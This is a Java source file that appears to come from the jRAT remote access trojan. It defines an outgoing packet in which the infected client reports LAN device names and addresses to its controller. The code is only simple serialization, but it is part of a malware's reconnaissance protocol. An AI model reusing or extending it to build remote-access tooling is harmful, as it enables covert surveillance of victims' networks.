package jrat.client.packets.outgoing;

import jrat.common.io.StringWriter;
import java.io.DataOutputStream;


public class Packet49LanDevices extends AbstractOutgoingPacket {

	private String device;
	private String address;

	public Packet49LanDevices(String device, String address) {
		this.device = device;
		this.address = address;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(this.device);

		if (this.address != null) {
			sw.writeLine(this.address);
		}
	}

	@Override
	public short getPacketId() {
		return 49;
	}

}
